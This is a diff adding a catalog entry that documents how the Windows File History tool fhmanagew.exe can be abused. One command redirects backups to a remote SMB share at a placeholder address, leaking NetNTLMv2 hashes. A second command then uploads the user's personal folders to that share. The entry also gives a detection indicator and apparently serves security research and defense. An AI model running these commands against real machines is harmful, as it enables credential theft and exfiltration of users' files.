@@ -1,0 +1,32 @@
+---
+Name: fhmanagew.exe
+Description: File History Management Tool
+Author: Benjamin Lim
+Created: 26 Jan 2021
+Commands:
+  - Command: fhmanagew.exe -migrate \\1.2.3.4\share
+    Description: Migrates the File History backup location to a remote drive.
+    Usecase: A SMB connection will be created to the remote location, causing NetNTLMv2 challenge hash to be sent in the process. Prerequisite: File Backup must be set up.
+    Category: Credentials
+    Privileges: User
+    MitreID: T1187
+    MitreLink: https://attack.mitre.org/techniques/T1187/
+    OperatingSystem: Windows 8, Windows 8.1, Windows 10
+  - Command: fhmanagew.exe -backupnow
+    Description: Triggers the start of the File History backup process.
+    Usecase: After migrating backup location to attacker controlled share, upload files from Documents, Music, Pictures, Videos, Desktop and OneDrive folder to new backup location. 
+    Category: Upload
+    Privileges: User
+    MitreID: T1567.002 
+    MitreLink: https://attack.mitre.org/techniques/T1567/002/
+    OperatingSystem: Windows 8, Windows 8.1, Windows 10
+Full_Path:
+  - Path: c:\windows\system32\fhmanagew.exe
+Detection: 
+  - IOC: SMB traffic from PID 4 to Internet destination 
+Resources:
+  - Link: https://limbenjamin.com/articles/lolbin-fhmanagew.html
+Acknowledgement:
+  - Person: Benjamin Lim
+    Handle: @limbenjamincom
+---
